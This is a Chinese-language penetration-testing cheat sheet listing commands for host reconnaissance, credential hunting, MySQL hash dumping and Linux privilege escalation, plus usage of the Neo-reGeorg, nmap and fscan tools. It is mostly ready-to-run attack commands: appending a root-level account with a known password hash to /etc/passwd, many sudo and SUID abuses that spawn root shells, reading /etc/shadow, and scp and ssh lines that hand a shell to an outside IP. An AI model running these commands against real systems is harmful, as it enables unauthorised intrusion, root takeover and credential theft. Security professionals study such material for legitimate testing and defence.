# 渗透

## 信息收集

### 收集登录信息

**Windows基础信息**

```nginx


# 查看网络连接
netstat -an

# 看登录日志
# 目的是为了寻找一下凭证如：数据库的凭证、Windows的smv凭证
# 然后根据这些凭证去寻找数据库的密码

# 查看Windows启动服务列表
net start

# 查看进程列表，可以看见运行了什么软件
tasklist

# 查看计划任务（无法加载就是权限不够）
schtasks


```

**Windows网络信息**

```nginx
# 判断存在域
ifconfig /all

net view /domain

net time /domain

netstat -ano

nslookup
```

**linux**

```nginx
# linux查看最近10次登录信息
last -n 10
# 这个登录信息上可能会有管理员的信息，要看管理员是从那台机器过来的
```



### 收集杀毒信息



### 收集密码信息

-   数据库账号密码
-   本地管理员账号密码
-   内存中的密码
    -   使用工具：mimikatz（限制Windows2008以下）
-   .ssh目录下的是否存在私钥





# 提权

## Mysql提权

**主要分为：用户自定义函数提权（UDF）、（MOF）**



### Hash获取与解密

```nginx
# MySQL <= 5.6 版本
select host, user, password from mysql.user;

# MySQL >= 5.7 版本
select host,user,authentication_string from mysql.user;

# 使用网站：https://www.cmd5.com/
# 选择类型为：mysql5
```



### UDF







```nginx
# 修改数据库密码
1. 登录 mysql 终端，运行：
mysql> set password=password('new password');
mysql>flush privileges;
2. 修改 mysql user 表
mysql>use mysql;
mysql>update user set password=password('new password') where user='root';
mysql>flush privileges;
3. 使用 GRANT 语句
mysql>GRANT ALL PRIVILEGES ON *.* TO 'root'@'127.0.0.1' IDENTIFIED BY 'new password' WITH GRANT OPTION;
mysql>flush privileges;
4. mysqladmin
[root@ubuntu]# mysqladmin -u root password "new password";（注意双引号或不加）
5. 备份数据库
[root@ubuntu]# mysqldump -u root -p --databases databasesname > /tmp/db.sql
```



## passwd

**普通用户可以查看：`/etc/passwd`**

**linux 的用户密码哈希存储在 `/etc/shadow` **

==查看passwd文件，如果第二列为**哈希**，则可以进行爆破，==

==如果为**X**，则哈希存储在**shadow**中==

```nginx
# 也可以进行生成密码在导入passwd中
	# 使用 Perl 编程语言中的 crypt 函数对字符串 "123456" 
	# 进行加密，使用的盐值为 "addedsalt"
perl -le 'print crypt("123456","addedsalt")'
echo "hack:adrla7IBSfTZQ:0:0:hack:/root:/bin/bash" >> passwd

# 使用 OpenSSL 库中的 passwd 工具生成一个经过加密的密码
	# 选项 -1 表示使用 MD5 算法进行加密
	# -salt hacker 指定了盐值为 "hacker"
openssl passwd -1 -salt hacker 123456
echo "hacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:0:0:hacker:/root:/bin/bash" >> /etc/passwd
```



## sudo提权

```nginx
# awk提权，通过使用awk命令的system函数调用/bin/sh
sudo awk 'BEGIN {system("/bin/sh")}'

# bash 提权（Linux 的默认 shell）
sudo bash

# curl 提权读文件
# /etc/shadow是Linux存储用户账户密码哈希值的文件
sduo curl file:///etc/shadow

# dash 提权
sudo dash

# ed 提权
# ed是Linux中功能最简单的文本编辑程序
sudo ed
!/bin/sh

# 查询环境变量
sudo env /bin/sh
id

# ftp 提权
sudo ftp
!/bin/sh

# less 提权（可以随意浏览文件）
sudo less /etc/passwd
!/bin/sh

# man（帮助手册命令）
sudo man man
!/bin/sh

# more 提权
# 类似cat，不过以一页一页的形式展示，按空格下一页，按b回退
sudo more /etc/passwd
!/bin/sh

# scp 提权
TF=$(mktemp)
echo 'sh 0<&2 1>&2' > $TF
chmod +x "$TF"
sudo scp -S $TF 112.124.52.200:20000 y:

# SSH
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' 反弹ip

# vi 提权
sudo vi -c ':!/bin/sh' /dev/null


# socat 提权(需要安装)
sudo socat stdin exec:/bin/sh

# zsh 提权（需要安装）
sudo zsh

# pico 提权
sudo pico
# Ctrl+R Ctrl+X
^R^X
reset; sh 1>&0 2>&0


# scp 提权
# 使用mktemp命令生成临时文件，将其路径保存在TF变量中
TF=$(mktemp)
# 向该临时文件中写入一行bash脚本代码
echo 'sh 0<&2 1>&2' > $TF
# 用chmod命令为临时文件设置可执行权限
chmod +x "$TF"
# 将该临时文件上传到远程主机x中
sudo scp -S $TF x y:


# perl 提权
sudo perl -e 'exec "/bin/sh";'

# git 提权
sudo git -p help config
!/bin/sh

# scrip 提权
sudo script -q /dev/null

###########################################################

# tclsh 提权（Ubuntu18 不安装）
sudo tclsh
exec /bin/sh <@stdin >@stdout 2>@stderr

# ash提权（Ubuntu18默认不安装）
sudo ash

# csh 提权（Ubuntu18默认不安装）
sudo csh

# expect 提权（Ubuntu18默认不安装）
# expect是一个自动化交互套件，主要应用于执行命令和程序时，
# 系统以交互形式要求输入指定字符串，实现交互通信
sudo expect -c 'spawn /bin/sh;interact'
```

## SID提权

```nginx
# 查找具体sid权限的文件
find / -perm -4000 -type f -exec ls -al {} \; 2>/dev/null

# taskset命令用于设置进程（或 线程）的处理器亲和性
# 可以将进程（或 线程）绑定到特定的一个
# 多个CPU上去执行，而不允许将进程（或 线程）调度到其他的CPU上。
taskset 1 /bin/sh -p
```



### SUID提权（靶场）

> **SUID这个是uid +s的组合，s指的是特殊权限**

> 一般情况下，用户的权限是3位，比如0755这样的，特殊权限默认没有配置，
>
> 但是如果超级管理员希望用户在执行一些特殊权限文件时，拥有root的权限，就会配置特殊权限

> 比如说passwd这个命令，这个命令会修改/etc/shadow文件，而/etc/shadow只有root才能修改，本来passwd这个命令应该也只能root才能执行的。但是系统为了让普通用户能够修改自己的密码，对passwd这个命令赋予了特殊权限并添加了只能修改自己密码的限制

```nginx
# find命令查找所有suid文件
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;

# 敏感文件
-rw-r--r-- 1 susan susan 20 Jul  9  2018 /home/susan/.secret

# 根据运行的结果进行利用
bob@linsecurity:~$ cat /home/susan/.secret 
MySuperS3cretValue!

# 登录到susan账户
su susan
MySuperS3cretValue!

# 如果存在xxd：以十六进制形式显示文件
-rwsr-x--- 1 root itservices 18552 Apr 10  2018 /usr/bin/xxd

# 它所在的itservices组具有执行权限，提权命令
xxd "/etc/shadow" |xxd -r
```



## 隐藏文件利用

```nginx
# 搜索home目录下的隐藏文件
find / -name ".*" -type f -path "/home/*" -exec ls -al {} \; 2>/dev/null
```



## NFS提权

```nginx
# nmap检测开放服务
nmap -sS -Pn -p- -A IP

# 目标地址运行命令验证是否挂载了NFS
rpcinfo -p 本机IP
```



# 渗透工具

## neoreg

官网地址：https://github.com/L-codes/Neo-reGeorg

> **他是一个socket代理工具，支持内网代理**

```nginx
# 这条命令生成各种后缀的代理文件，password为任意
python neoreg.py generate -k password

# 本地开启代理，并输入代理目标地址
python3 neoreg.py -k password -u http://xx/tunnel.php
```



## nmap

官网地址：https://nmap.org/download.html

npcat无法使用重新安装：https://npcap.com/#download

> **网络扫描和端口扫描工具**

```nginx
# 综合扫描选项，包含操作系统识别、端口扫描和脚本扫描
nmap -A ip

# 探测主机是否在线
nmap -sS ip

# 忽略主机的存活检测，直接进行端口扫描
	# 因为nmap会先对主机进行ping测试或者其他存活，
	# 如果判断主机连接不了或者被过滤了请求就不会进行端口扫描
nmap -Pn ip

# 探测主机端口状态
nmap -sT ip

# 探测主机开放的UDP端口
nmap -sU ip

# 识别目标主机操作系统类型和版本
nmap -O ip

# 指定端口扫描范围
nmap -p 80-100 ip
nmap -p 80,443,8080 ip

# 显示详细信息，包括扫描过程中的进度、扫描结果和统计信息
nmap -v ip
```



## fscan

**下载地址**：https://github.com/shadow1ng/fscan/releases/download/1.8.2/fscan_386

> 一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描
>
> - 支持主机**存活探测**、**端口扫描**、常见服务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指纹识别、web漏洞扫描、netbios探测、域控识别等功能。

- 信息收集

  - **存活探测(icmp)**
  - **端口扫描**

- 爆破功能:

  - 各类服务爆破(ssh、smb、rdp等)
  - 数据库密码爆破(mysql、mssql、redis、psql、oracle等)
- 系统信息、漏洞扫描:

  - netbios探测、域控识别
  - 获取目标网卡信息
  - 高危漏洞扫描(ms17010等)

- Web探测功能:

  - webtitle探测
  - web指纹识别(常见cms、oa框架等)
  - web漏洞扫描(weblogic、st2等,支持xray的poc)

- 漏洞利用:

  - redis写公钥或写计划任务
  - ssh命令执行
  - ms17017利用(植入shellcode),如添加用户等

- 其他功能:

  - 文件保存

### 使用

```nginx
# 首先需要知道本机ip
ifconfig

# 然后将下载文件上传到服务器
# 赋予：读写执行权限
chmod 777 fscan_386

fscan_386 -h 192.168.1.1/24  (默认使用全部模块)
fscan_386 -h 192.168.1.1/16  (B段扫描)

# 扫描并将扫描结果写入文件
fscan_386 -h 192.168.0.2/24 -o 0vers1eep.txt 
```

